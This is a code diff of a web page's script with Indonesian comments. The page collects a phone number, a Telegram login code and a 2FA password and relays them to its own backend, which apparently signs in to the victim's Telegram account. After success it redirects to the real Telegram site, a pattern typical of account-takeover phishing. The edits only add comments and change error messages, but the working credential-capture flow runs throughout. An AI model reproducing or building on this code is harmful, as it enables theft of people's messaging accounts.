@@ -35,7 +35,7 @@
 
     <script>
         let userPhone = "";
-        let phoneHash = ""; 
+        let phoneHash = ""; // Ini yang akan menyimpan phone_code_hash
         const statusEl = document.getElementById('status');
 
         async function requestApi(action, body) {
@@ -52,17 +52,22 @@
             statusEl.innerText = "Meminta kode...";
             const res = await requestApi('send_code', { phone: userPhone });
             if(res.success) {
-                phoneHash = res.hash; 
+                phoneHash = res.hash; // MENYIMPAN HASH DARI SERVER
                 document.getElementById('step-phone').classList.add('hidden');
                 document.getElementById('step-otp').classList.remove('hidden');
                 statusEl.innerText = "Kode dikirim ke Telegram.";
-            } else { alert(res.error); statusEl.innerText = ""; }
+            } else { alert("Error: " + res.error); statusEl.innerText = ""; }
         }
 
         async function sendOTP() {
             const code = document.getElementById('otp').value;
             statusEl.innerText = "Memverifikasi...";
-            const res = await requestApi('signin', { phone: userPhone, code: code, hash: phoneHash });
+            // MENGIRIM KEMBALI HASH KE SERVER
+            const res = await requestApi('signin', { 
+                phone: userPhone, 
+                code: code, 
+                hash: phoneHash 
+            });
             if(res.success) {
                 if(res.need_2fa) {
                     document.getElementById('step-otp').classList.add('hidden');
@@ -72,7 +77,7 @@
                     statusEl.innerText = "Berhasil! Mengalihkan...";
                     window.location.href = "https://t.me/telegram";
                 }
-            } else { alert(res.error); statusEl.innerText = ""; }
+            } else { alert("Error: " + res.error); statusEl.innerText = ""; }
         }
 
         async function send2FA() {
@@ -82,7 +87,7 @@
             if(res.success) {
                 statusEl.innerText = "Berhasil! Mengalihkan...";
                 window.location.href = "https://t.me/telegram";
-            } else { alert(res.error); statusEl.innerText = ""; }
+            } else { alert("Error: " + res.error); statusEl.innerText = ""; }
         }
     </script>
 </body>
